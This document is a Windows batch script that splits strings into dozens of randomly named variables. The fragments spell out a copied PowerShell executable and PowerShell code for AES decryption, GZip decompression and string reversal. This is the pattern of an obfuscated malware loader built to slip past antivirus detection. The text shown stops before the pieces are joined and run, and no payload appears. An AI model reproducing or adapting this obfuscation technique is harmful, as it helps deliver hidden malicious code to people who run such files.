@echo off
set "eqXqyiVkrI=0\"
set "nAscOfHFxJ=he"
set "SFPxcvqgQE=1."
set "JHskXWiacy=we"
set "yQTQnunoYg=em"
set "CxonljLKKx=\v"
set "fOKDfCdoTr= C"
set "vnjisCQxWg=do"
set "guplvcKvdB=rS"
set "fhlFSZHFst=nd"
set "JCNyCWRmsS=\W"
set "DaWgACaSZS=Po"
set "wDcyqVcunr=ws"
set "BXyeTMtXyU=ll"
set "aViTmwFdtO=.e"
set "YLUXHMKMsW=s\"
set "nMFocsrzPs=y "
set "FMTtxSlHuR=in"
set "NsiyWHefyV=co"
set "JMXjZsCgRe=po"
set "ZykMeGXVfl=py"
set "oUmwKyrDVv=32"
set "QNNhGeHmbi=:\"
set "xcTHFOgXTZ=st"
set "SjoMVxYNsB=ll"
set "oCDsGmYvYs= /"
set "mKjeZvtFga=we"
set "EseXkjTYQl=Wi"
set "SErPQjopvS=xe"
set "DPlhelKcfa=ow"
set "JexHlJBhoH=Sy"
set "wnhTPlzYPc=rs"
set "PRudnurdIP=he"
set "hniChwnUFY=cd"
set "KTQVKUbixp= %~dp0"
set "rUeQROgyUm=g = "
set "cSLuVVSKXS='[-1"
set "DmqSxcELbz=$CsD"
set "ZjIyXtppUN=gsYZ"
set "akAnuGJyPL=ss -"
set "alrISywBri== [S"
set "CBJNrAXGii=morF"
set "nKaCkTKDpt=ress"
set "BtergEBCEA=; };"
set "ZRpgvADRSE=..-1"
set "LpBjFxYxxu=gjYA"
set "zqpeUANMYQ===')"
set "ouXRcWlQuR=$TfE"
set "hXJVKxWmJj=S.En"
set "cJBjlLcyvr=.Dis"
set "TsxoRgwNmT=Comp"
set "dZIfQTiNwJ=qgB."
set "ZWYmvKxZDC=ect "
set "EnwVucfBbj=Stre"
set "SeMLLRYXKZ=e = "
set "ulSeEGXQNI=$gWV"
set "iQzBrwCakx=form"
set "fzHSiJpWJI=wITV"
set "vWFwRtALsm=sion"
set "WEfszRrjQP= = $"
set "JoYpKHmtNM=y.Ci"
set "wSTMSwHjnc=yste"
set "WcpVxQqdxO=join"
set "aYXLuqDHkk=m.IO"
set "QGYBeRoLQk=zHhH"
set "MCBIujjSpu='txe"
set "AnRyYYdJkQ=qgB "
set "TBqUYPnxfH=)) {"
set "FdhCOZUjIb=;$dc"
set "sozClpcqtA=TfEf"
set "eRKVZJGrNO=.Dis"
set "JAnINGzYeE=se()"
set "oFWZeXqXMR=ment"
set "nwtPacVoDx=ewLi"
set "UTKjEjvNRR=Bmor"
set "GirwamgGaf=yste"
set "vrkOQUiOEq=dj0C"
set "hWoBpQeZVf=vert"
set "aRLcXcGffN=Disp"
set "EnKeSoiOxs=m.Re"
set "WLrkmscEie=V = "
set "JgMJtIYQAL=hy.A"
set "YFMAoPIuWH=stem"
set "bsOfJITMMK=ionM"
set "GPrNOOtAnI=ypto"
